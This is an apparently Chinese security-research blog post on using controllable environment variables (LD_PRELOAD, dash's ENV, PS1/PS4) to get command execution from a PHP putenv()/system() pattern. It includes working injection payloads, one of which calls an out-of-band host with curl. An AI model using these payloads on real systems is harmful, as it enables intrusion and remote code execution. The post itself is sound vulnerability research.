@@ -1,0 +1,701 @@
+
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+  <meta name="description" content="phith0n的小站，长期存在与分享关于网络安全与各种编程的原创文章。">
+  <meta name="keywords" content="phith0n,网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python">
+  <link rel="shortcut icon" href="../static/cactus/images/favicon.ico">
+  <link rel="icon" type="image/png" href="../static/cactus/images/favicon-192x192.png" sizes="192x192">
+  <link rel="apple-touch-icon" sizes="180x180" href="../static/cactus/images/apple-touch-icon.png">
+  <link rel="alternate" type="application/atom+xml" href="../feed/index.rss" title="离别歌"/>
+
+  <title>我是如何利用环境变量注入执行任意命令 | 离别歌</title>
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://cdn.staticfile.org/bootstrap/5.1.3/css/bootstrap-grid.min.css">
+  <link rel="stylesheet" href="../static/cactus/css/style%EF%B9%96v=20220521.css">
+  
+  <link rel="stylesheet" href="../static/cactus/css/code%EF%B9%96v=20211026.css">
+  <link href="https://cdn.staticfile.org/fancybox/2.1.7/css/jquery.fancybox.min.css" rel="stylesheet">
+
+</head>
+<body>
+
+
+
+  <div class="sticky">
+    <a href="#" id="menu-icon" class="menu-icon active"><i class="fa fa-bars fa-lg"></i></a>
+    <div class="menu">
+      <ul>
+        <li><a href="../index.html">主页</a></li>
+        <li><a href="javascript:history.back(-1)">返回</a></li>
+      </ul>
+      <br>
+    </div>
+    <div class="clearfix"></div>
+    <div class="info" style="position: fixed">
+      <span id="i-top" style="display: none">Back to top</span>
+      <span id="i-share" style="display: none">Share post</span>
+    </div>
+    <ul class="actions">
+      <li><a class="icon" href="#" id="back-top"><i
+          class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();"
+          onmouseout="$('#i-top').toggle();"></i></a></li>
+      <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true"
+                                      onmouseover="$('#i-share').toggle();"
+                                      onmouseout="$('#i-share').toggle();"
+                                      onclick="$('#share').toggleClass('hidden');return false;"></i></a></li>
+    </ul>
+    <div id="share" class="hidden">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html&amp;text=%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html&amp;title=%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html&amp;is_video=false&amp;description=%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4&amp;body=Check out this article: https%3A//www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html&amp;title=%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html&amp;title=%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html&amp;title=%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html&amp;title=%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html&amp;name=%E6%88%91%E6%98%AF%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5%E6%89%A7%E8%A1%8C%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4&amp;description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+    </div>
+  </div>
+
+  <div class="container-md">
+    <div class="article row justify-content-center min-height">
+      <div class="col-lg-8 col-md-10 col-sm-12">
+        <article itemscope itemtype="http://schema.org/BlogPosting">
+          <header class="post-header">
+            <h1 class="color-main h1 mb-0" itemprop="name headline">我是如何利用环境变量注入执行任意命令</h1>
+            <div class="meta">
+              <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+                <span itemprop="name">phithon</span>
+              </span>
+
+              <div class="postdate">
+                <time datetime="2022年2月20日 03:47" itemprop="datePublished">
+                  2022 二月 20 03:47
+                </time>
+              </div>
+
+              <div class="article-tag">
+                阅读：37575
+              </div>
+
+              
+                <div class="article-tag">
+                  <i class="fa fa-bookmark"></i>
+                  <a class="tag-link" href="../sort/PENETRATION.html">网络安全</a>
+                </div>
+              
+
+              
+                <div class="article-tag">
+                  <i class="fa fa-tag"></i>
+                  
+                    <a class="tag-link" href="../tag/dash.html">dash</a>,
+                  
+                  
+                    <a class="tag-link" href="../tag/bash.html">bash</a>,
+                  
+                  
+                    <a class="tag-link" href="../tag/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5.html">环境变量注入</a>
+                  
+                </div>
+              
+            </div>
+          </header>
+          <div class="content" itemprop="articleBody">
+            <blockquote>
+<p>本文发表于<a href="https://tttang.com/archive/1450/" target="_blank">跳跳糖</a>，转载请联系对方。</p>
+</blockquote>
+<p>这周三在『<a href="https://t.zsxq.com/66e2Nzj" target="_blank">代码审计知识星球</a>』中发了一段代码，用户可以控制环境变量，但后面没有太多可控的地方，最后找到了一处执行命令，不过命令用户也不可控。用PHP来演示一下就是下面这7行：</p>
+<div class="codehilite"><pre><span></span><code><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="k">foreach</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">&#39;envs&#39;</span><span class="p">]</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nb">putenv</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">{</span><span class="nv">$key</span><span class="si">}</span><span class="s2">=</span><span class="si">{</span><span class="nv">$val</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="c1">//... 一些其他代码</span>
+<span class="nb">system</span><span class="p">(</span><span class="s1">&#39;echo hello&#39;</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</code></pre></div>
+
+<p>请问这段代码如何利用，是否可以getshell？</p>
+<h2 id="0x01-ld_preload"><a class="toclink" href="#0x01-ld_preload">0x01 <code>LD_PRELOAD</code>之后的思考</a></h2>
+<p>在有上传点（无需控制文件名）的情况下，这段代码其实比较简单了，可以直接用<code>LD_PRELOAD</code>搞定。上传一个文件名不限的so文件，如<code>hj.jpg</code>，可以通过<code>LD_PRELOAD=/var/www/html/uploads/hj.jpg</code>这样的方法劫持并执行任意代码。</p>
+<p>但我这里并没有给上传接口，如何解决这个问题呢？这就是本文研究的课题。</p>
+<p>打开PHP的底层源码，看下PHP的system函数实际上在做什么。</p>
+<div class="codehilite"><pre><span></span><code><span class="cp">#define VCWD_POPEN(command, type) popen(command, type)</span>
+<span class="c1">// ...</span>
+
+<span class="n">PHPAPI</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">php_exec</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">type</span><span class="p">,</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">cmd</span><span class="p">,</span><span class="w"> </span><span class="n">zval</span><span class="w"> </span><span class="o">*</span><span class="n">array</span><span class="p">,</span><span class="w"> </span><span class="n">zval</span><span class="w"> </span><span class="o">*</span><span class="n">return_value</span><span class="p">)</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="kt">FILE</span><span class="w"> </span><span class="o">*</span><span class="n">fp</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="c1">// ...</span>
+
+<span class="cp">#ifdef PHP_WIN32</span>
+<span class="w">    </span><span class="n">fp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">VCWD_POPEN</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;rb&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="cp">#else</span>
+<span class="w">    </span><span class="n">fp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">VCWD_POPEN</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;r&quot;</span><span class="p">);</span><span class="w"></span>
+<span class="cp">#endif</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">fp</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="n">php_error_docref</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">E_WARNING</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;Unable to fork [%s]&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">cmd</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="k">goto</span><span class="w"> </span><span class="n">err</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="c1">// ...</span>
+</code></pre></div>
+
+<p>可见，PHP的system调用的是系统的<code>popen()</code>。我们再深入一层，看看popen究竟在做什么。</p>
+<h2 id="0x02"><a class="toclink" href="#0x02">0x02 寻找系统层源码的方法</a></h2>
+<p>在此之前，先分享一下我们如何找到一些Linux中自带工具、库的源码。</p>
+<p>理论上因为Linux是开源的，所以所有源码都可以拿到。这里介绍三种方法，我们以“echo”这个命令为例。</p>
+<h3 id="_1"><a class="toclink" href="#_1">方法一、在系统源里查找源码</a></h3>
+<p>这种方法是相对比较精确的，比如，我们要复现的目标环境是Ubuntu，那么我们就在Ubuntu的apt源里找相关代码。整体过程如下：</p>
+<p><a href="../media/attachment/2022/02/21/a9643a1b-cc17-4dce-b2f5-0236cfa44cc4.png"><img alt="image.png" src="../media/attachment/2022/02/21/a9643a1b-cc17-4dce-b2f5-0236cfa44cc4.45d75e752161.png" /></a></p>
+<p>我之前<a href="https://t.zsxq.com/zZzZZZZ" target="_blank">在星球介绍过command-not-found</a>，这个网站可以查询到一个命令在各种操作系统中的包名。比如，echo所在的软件包是coreutils：</p>
+<p><a href="../media/attachment/2022/02/21/71e96214-0754-42b4-be36-562792d2ac06.png"><img alt="image.png" src="../media/attachment/2022/02/21/71e96214-0754-42b4-be36-562792d2ac06.80a6bcd62303.png" /></a></p>
+<p>然后来到Ubuntu Packages里搜索coreutils，找到它的详情页面，右侧就有源码包的下载地址：</p>
+<p><a href="../media/attachment/2022/02/21/c2a818ce-b556-4c90-92a3-8dfd4dbda9f9.png"><img alt="image.png" src="../media/attachment/2022/02/21/c2a818ce-b556-4c90-92a3-8dfd4dbda9f9.a44605715455.png" /></a></p>
+<p>下载其中orig的那个文件即可。</p>
+<h3 id="gnuorg"><a class="toclink" href="#gnuorg">方法二、在GNU.ORG下载源码</a></h3>
+<p>方法二和方法一略有不同的是，方法二在获取包名后，去<a href="https://www.gnu.org/software/" target="_blank">GNU官网</a>上找源码，而不是去具体发行版的源里。</p>
+<p>还是以echo为例，获取到echo的包名coreutils后，在GNU网站上就可以找到coreutils的详情页面：<a href="https://www.gnu.org/software/coreutils/" target="_blank">https://www.gnu.org/software/coreutils/</a></p>
+<p>其中不但给了这个包的介绍、下载地址，还有它的Git仓库，通过Git能获取到更详细的历史代码，这是这个方法的优点：</p>
+<p><a href="../media/attachment/2022/02/21/6780dc5c-cd9a-4dcc-a2e3-ef5b4d39e2eb.png"><img alt="image.png" src="../media/attachment/2022/02/21/6780dc5c-cd9a-4dcc-a2e3-ef5b4d39e2eb.8eb3ab76daee.png" /></a></p>
+<p>直接下载源码包或者拉取git仓库即可。</p>
+<h3 id="apt"><a class="toclink" href="#apt">方法三、直接用过apt命令下载源码</a></h3>
+<p>上面两种方法获取的源码都可能和线上环境有一些差异，原因我曾在《<a href="linux-suid-privilege-escalation.html" target="_blank">谈一谈Linux与suid提权</a>》简单介绍过。Ubuntu、Debian这样的Linux发行版，通常会自行给自己仓库里的程序打补丁，而我们前两个方法中下载的源码包都是没打补丁的原始包，这可能会导致我们研究的东西和线上环境存在差异。</p>
+<p>第三种方法是第一种方法的命令行版，它的优点就是可以解决“补丁”的问题。</p>
+<p>仍然以Ubuntu为例，使用这个方法前需要先配置好apt源，需要有deb-src类型的源。如果你在国内，可以直接使用清华的<a href="https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/" target="_blank">Ubuntu源</a>，将其中deb-src开头的注释符去掉即可。</p>
+<p>然后，我们直接执行<code>apt source [package_name]</code>即可在当前目录下获得这个软件的源码，并应用所有的补丁包：</p>
+<p><a href="../media/attachment/2022/02/21/bfb202e2-49ee-403c-b546-33ee305dcaea.png"><img alt="image.png" src="../media/attachment/2022/02/21/bfb202e2-49ee-403c-b546-33ee305dcaea.d117a8de551a.png" /></a></p>
+<p>上图中，最后生成了4个文件（目录），他们分别是：</p>
+<ul>
+<li>coreutils的源码，已经打好所有补丁</li>
+<li>orig.tar.xz压缩包，其中包含的是原始代码</li>
+<li>debian.tar.xz压缩包，其中包含的是所有的补丁文件</li>
+<li>dsc文件，里面包含的是这个软件的描述和元信息，dsc是description的缩写</li>
+</ul>
+<p>这个方法获取到的源码应该是与Ubuntu软件编译时的源码相同，属于最佳方法。其缺点就是源码版本较新，当你想测试存在漏洞的老版本，就不能使用这个方法了；另外如果你手头没有Linux系统，自然也没法使用这个方法。</p>
+<p>回到本文研究的popen，我们知道这个函数是Linux glibc提供的一个函数，那么我就去找了glibc的源码。使用方法一，我们很容易找到了下载地址：<a href="http://archive.ubuntu.com/ubuntu/pool/main/g/glibc/glibc_2.31.orig.tar.xz" target="_blank">http://archive.ubuntu.com/ubuntu/pool/main/g/glibc/glibc_2.31.orig.tar.xz</a></p>
+<p>下载找到popen的代码，跟进会发现，实际上popen最终执行的是这个<code>spawn_process</code>函数：</p>
+<div class="codehilite"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">bool</span><span class="w"></span>
+<span class="nf">spawn_process</span><span class="w"> </span><span class="p">(</span><span class="n">posix_spawn_file_actions_t</span><span class="w"> </span><span class="o">*</span><span class="n">fa</span><span class="p">,</span><span class="w"> </span><span class="kt">FILE</span><span class="w"> </span><span class="o">*</span><span class="n">fp</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">command</span><span class="p">,</span><span class="w"></span>
+<span class="w">           </span><span class="kt">int</span><span class="w"> </span><span class="n">do_cloexec</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">pipe_fds</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">parent_end</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">child_end</span><span class="p">,</span><span class="w"></span>
+<span class="w">           </span><span class="kt">int</span><span class="w"> </span><span class="n">child_pipe_fd</span><span class="p">)</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+
+<span class="w">  </span><span class="c1">//...</span>
+
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">__posix_spawn</span><span class="w"> </span><span class="p">(</span><span class="o">&amp;</span><span class="p">((</span><span class="n">_IO_proc_file</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="n">fp</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">,</span><span class="w"> </span><span class="n">_PATH_BSHELL</span><span class="p">,</span><span class="w"> </span><span class="n">fa</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"></span>
+<span class="w">             </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="k">const</span><span class="p">[]){</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="s">&quot;sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="s">&quot;-c&quot;</span><span class="p">,</span><span class="w"></span>
+<span class="w">             </span><span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="n">command</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="w"> </span><span class="p">},</span><span class="w"> </span><span class="n">__environ</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">  </span><span class="c1">//...</span>
+
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nb">true</span><span class="p">;</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+
+<p>从第9行代码可看出，最终执行的是命令<code>sh -c "echo hello"</code>。</p>
+<h2 id="0x03-dash"><a class="toclink" href="#0x03-dash">0x03 调试dash，找到可利用的环境变量</a></h2>
+<p>那么，现在我们的问题变成了：<strong>我可以控制执行<code>sh -c "echo hello"</code>时的环境变量，是否可以getshell</strong>？</p>
+<p><code>sh -c "echo hello"</code>虽然是一条命令，但是实际上它执行了两个二进制文件：</p>
+<ul>
+<li>sh</li>
+<li>echo</li>
+</ul>
+<p>其中，sh通常只是一个软连接，并不是真的有一个shell叫sh。在debian系操作系统中，sh指向dash；在centos系操作系统中，sh指向bash。</p>
+<p>由于我们目标是Ubuntu，属于debian系，所以我们来研究下echo和dash两个程序是否可利用。</p>
+<p>先挑简单的，上面我说了如何找到echo的源码（即coreutils包的源码）。echo的<a href="https://github.com/coreutils/coreutils/blob/master/src/echo.c" target="_blank">源码</a>不长，总共就200多行，其中只有一个和环境变量相关的操作：</p>
+<div class="codehilite"><pre><span></span><code><span class="w">  </span><span class="kt">bool</span><span class="w"> </span><span class="n">allow_options</span><span class="w"> </span><span class="o">=</span><span class="w"></span>
+<span class="w">    </span><span class="p">(</span><span class="o">!</span><span class="w"> </span><span class="n">getenv</span><span class="w"> </span><span class="p">(</span><span class="s">&quot;POSIXLY_CORRECT&quot;</span><span class="p">)</span><span class="w"></span>
+<span class="w">     </span><span class="o">||</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="w"> </span><span class="n">DEFAULT_ECHO_TO_XPG</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">argc</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">STREQ</span><span class="w"> </span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="s">&quot;-n&quot;</span><span class="p">)));</span><span class="w"></span>
+</code></pre></div>
+
+<p>但这是个bool类型的变量，并没有利用价值。</p>
+<p>接着关注点来到dash。按照前面的方法下载到dash的<a href="http://archive.ubuntu.com/ubuntu/pool/main/d/dash/dash_0.5.10.2.orig.tar.gz" target="_blank">源码</a>进行阅读，其main函数中有一段引起了我的注意：</p>
+<div class="codehilite"><pre><span></span><code><span class="k">if</span><span class="w"> </span><span class="p">((</span><span class="n">shinit</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">lookupvar</span><span class="p">(</span><span class="s">&quot;ENV&quot;</span><span class="p">))</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="nb">NULL</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">*</span><span class="n">shinit</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="sc">&#39;\0&#39;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="n">read_profile</span><span class="p">(</span><span class="n">shinit</span><span class="p">);</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+
+<p>lookupvar用于查找上下文中的变量，在shell中变量即为环境变量，所以这里等于找到了一个名为<code>ENV</code>的环境变量并传入<code>read_profile</code>函数中。</p>
+<p><code>read_profile</code>函数作用是读取SHELL中的profile文件，类似于<code>$HOME/.profile</code>这种：</p>
+<div class="codehilite"><pre><span></span><code><span class="n">STATIC</span><span class="w"> </span><span class="kt">void</span><span class="w"></span>
+<span class="n">read_profile</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">name</span><span class="p">)</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">expandstr</span><span class="p">(</span><span class="n">name</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">setinputfile</span><span class="p">(</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">INPUT_PUSH_FILE</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">INPUT_NOFILE_OK</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"></span>
+<span class="w">        </span><span class="k">return</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">    </span><span class="n">cmdloop</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="n">popfile</span><span class="p">();</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+
+<p>但很有意思的是，这里它对文件名name变量做了一次<code>expandstr</code>，也就是解析。</p>
+<p>这个解析的目的是支持SHELL语法，比如会将<code>$HOME</code>解析成实际的家目录地址。既然支持SHELL语法，那么可能会支持执行命令。所以，我尝试了如下命令：</p>
+<div class="codehilite"><pre><span></span><code><span class="nv">ENV</span><span class="o">=</span><span class="s1">&#39;$(curl 675ba661.o53.xyz)&#39;</span> dash -c id
+</code></pre></div>
+
+<p>然而并没有收到curl请求日志，说明这里并没有成功注入命令。</p>
+<h2 id="0x04-dash"><a class="toclink" href="#0x04-dash">0x04 编译调试dash，复现问题</a></h2>
+<p>原因是什么呢？</p>
+<p>由于我现在只是简单看了看dash的代码，而且dash的代码中很多goto，难以阅读，所以我决定对dash进行动态调试。</p>
+<p>还是采用我在星球介绍过的vscode远程调试的方法来调试，具体过程可以参考调试Apache HTTPd的<a href="https://t.zsxq.com/7euBUNf" target="_blank">这篇帖子</a>。vscode连接到远程的dash源码的文件夹后，执行如下命令编译dash：</p>
+<div class="codehilite"><pre><span></span><code><span class="nv">CFLAGS</span><span class="o">=</span><span class="s2">&quot;-g&quot;</span> ./configure --prefix<span class="o">=</span>/root/workspace/dash
+make
+make install
+</code></pre></div>
+
+<p>编译好的dash就在<code>/root/workspace/dash/bin</code>目录下，添加一个vscode调试配置项，配置好启动的参数和环境变量：</p>
+<p><a href="../media/attachment/2022/02/21/9884f043-f9e6-4897-85d4-f47b8da58088.png"><img alt="image.png" src="../media/attachment/2022/02/21/9884f043-f9e6-4897-85d4-f47b8da58088.c64d828a6d98.png" /></a></p>
+<p>在main函数里下断点，调试可以发现，程序并没有进入到我们上面分析的那个if语句中：</p>
+<p><a href="../media/attachment/2022/02/21/7d54a730-6176-45b1-a998-ee1da4739096.png"><img alt="image.png" src="../media/attachment/2022/02/21/7d54a730-6176-45b1-a998-ee1da4739096.bb4909fd39fb.png" /></a></p>
+<p>关键原因就是其中的<code>iflag</code>变量。经过分析发现，这个变量表示执行dash时是否传入了<code>-i</code>参数。</p>
+<p>所以，我们将启动dash时的参数<code>-c</code>改成<code>-i -c</code>，再重新执行，即可发现成功进入<code>read_profile</code>：</p>
+<p><a href="../media/attachment/2022/02/21/c1b5be81-4a06-4760-bd76-feffc7a0ec69.png"><img alt="image.png" src="../media/attachment/2022/02/21/c1b5be81-4a06-4760-bd76-feffc7a0ec69.0aaa4742755c.png" /></a></p>
+<p>日志平台收到了web请求，所以，这个<code>ENV</code>环境变量确实存在一处命令注入的问题，当然也可以认为这是个feature。</p>
+<p>大家使用下面这条语句即可简单复现该问题：</p>
+<div class="codehilite"><pre><span></span><code>ENV=&#39;$(id 1&gt;&amp;2)&#39; dash -i -c &#39;echo hello&#39;
+</code></pre></div>
+
+<p><a href="../media/attachment/2022/02/21/de438649-abc0-4f8d-9b0c-b71cb0dd83c1.png"><img alt="image.png" src="../media/attachment/2022/02/21/de438649-abc0-4f8d-9b0c-b71cb0dd83c1.b2abf211705c.png" /></a></p>
+<h2 id="0x05"><a class="toclink" href="#0x05">0x05 寻找其他的命令注入</a></h2>
+<p>当然，这个命令注入并没有解决本文开始遇到的问题，因为PHP的system函数执行的是<code>sh -c</code>，并没有传入<code>-i</code>参数。</p>
+<p>那我们看看是否还有类似的问题呢？</p>
+<p>我全局搜索了一下<code>read_profile</code>和<code>expandstr</code>这两个函数，看看是否有可控的环境变量进入。</p>
+<p>最后发现<code>PS1</code>、<code>PS2</code>、<code>PS4</code>这三个环境变量也是会被<code>expandstr</code>函数解析的，但是才疏学浅地我研究了一晚上PS4，发现它只能解析变量，无法执行命令，但我并没有弄明白原因：</p>
+<p><a href="../media/attachment/2022/02/21/fdeb6053-22be-47e3-9025-0b0c51425c1d.png"><img alt="image.png" src="../media/attachment/2022/02/21/fdeb6053-22be-47e3-9025-0b0c51425c1d.a6e46564087f.png" /></a></p>
+<p>PS1是很好触发的，但需要进入交互式shell中方可执行：</p>
+<p><a href="../media/attachment/2022/02/21/1a3efd03-61cd-46c7-9a1b-636c40a9e5f8.png"><img alt="image.png" src="../media/attachment/2022/02/21/1a3efd03-61cd-46c7-9a1b-636c40a9e5f8.27f2040d4bf3.png" /></a></p>
+<h2 id="0x06-bash_env"><a class="toclink" href="#0x06-bash_env">0x06 <code>BASH_ENV</code>导致的命令注入</a></h2>
